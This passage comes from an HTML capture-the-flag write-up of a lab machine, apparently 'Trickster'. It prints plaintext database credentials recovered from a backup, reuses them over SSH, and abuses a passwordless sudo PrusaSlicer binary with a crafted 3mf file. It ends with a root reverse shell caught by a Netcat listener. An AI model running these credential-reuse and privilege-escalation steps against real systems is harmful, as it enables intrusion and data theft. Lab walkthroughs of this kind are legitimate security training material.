+ extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
+ extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
+  inflating: secret.txt              
+  inflating: url-list.txt            
+  inflating: url-list-with-tags.txt  
+  inflating: url-watches.json   </code></pre>
+</div></div>
+<p>I used <strong>brotli</strong> to decompress the <strong>f04f0732f120c0cc84a993ad99decb2c.txt.br</strong> file, which resulted in the <strong>f04f0732f120c0cc84a993ad99decb2c.txt</strong> file. Upon reviewing its contents, I found potentially useful information related to the backup. This file, along with the other extracted files, could provide insight into the system&#x27;s configuration or sensitive data that may aid in further exploitation.We get adam Database credentials </p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>cat f04f0732f120c0cc84a993ad99decb2c.txt 
+
+&lt;SNIP&gt;                                                                                                                         
+                &#x27;database_host&#x27; =&gt; &#x27;127.0.0.1&#x27; ,                                                                                                                       
+                &#x27;database_port&#x27; =&gt; &#x27;&#x27; ,                                                                                                                                
+                &#x27;database_name&#x27; =&gt; &#x27;prestashop&#x27; ,                                                                                                                      
+                &#x27;database_user&#x27; =&gt; &#x27;adam&#x27; ,                                                                                                                            
+                &#x27;database_password&#x27; =&gt; &#x27;adam_admin992&#x27; ,
+&lt;SNIP&gt;</code></pre>
+</div></div>
+</section>
+
+<section id="Privilege Escalation" class="section">
+<h2>Privilege Escalation:</h2><p>Using the Database credentials of Adam to login via ssh.</p><p>After logging in via <strong>SSH</strong> as <strong>adam</strong> on <strong>trickster.htb</strong>, I ran <code>sudo -l</code> to check for any <strong>sudo</strong> privileges. The output revealed that <strong>adam</strong> can execute the command <code><strong>/opt/PrusaSlicer/prusaslicer</strong></code> as <strong>root</strong> without requiring a password. This provides an opportunity for privilege escalation, as we can potentially exploit this command to gain <strong>root access</strong>.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code>ssh adam@trickster.htb                                
+adam@trickster.htb&#x27;s password: 
+adam@trickster:~$ sudo -l
+Matching Defaults entries for adam on trickster:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User adam may run the following commands on trickster:
+    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
+</code></pre>
+</div></div>
+<p>We can use the <strong><a href="https://github.com/suce0155/prusaslicer_exploit/">PrusaSlicer exploit</a></strong> to escalate privileges and gain <strong>root access</strong> on the target machine. The exploit leverages the fact that <strong>adam</strong> can run <code><strong>/opt/PrusaSlicer/prusaslicer</strong></code> with <strong>sudo</strong> privileges, allowing us to bypass the restrictions and execute arbitrary commands with root privileges. By exploiting this, we can escalate from a normal user to <strong>root</strong> and further compromise the system.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf
+10 =&gt; Processing triangulated mesh
+20 =&gt; Generating perimeters
+30 =&gt; Preparing infill
+45 =&gt; Making infill
+65 =&gt; Searching support spots
+69 =&gt; Alert if supports needed
+print warning: Detected print stability issues:
+
+EXPLOIT
+Low bed adhesion
+
+Consider enabling supports.
+Also consider enabling brim.
+88 =&gt; Estimating curled extrusions
+88 =&gt; Generating skirt and brim
+90 =&gt; Exporting G-code to EXPLOIT_0.3mm_{printing_filament_types}_MK4_{print_time}.gcode
+
+</code></pre>
+</div></div>
+<p>After setting up a <strong>Netcat listener</strong>, we were able to receive a <strong>reverse shell</strong> and successfully escalate to <strong>root</strong>. This gave us full control over the system, allowing us to perform any further actions or exfiltrate data as needed.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>nc -lvnp 1234                                    
+listening on [any] 1234 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.231.135] 44016
+root@trickster:/tmp# cd /root
+cd /root
+root@trickster:~# ls
+ls
+root.txt
+</code></pre>
+</div></div>
+</section>
+ </div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+<footer>
+  <div class="copyright">
+    © 2025 | D3p4K
+  </div>
+</footer>
+</body>
+</html>
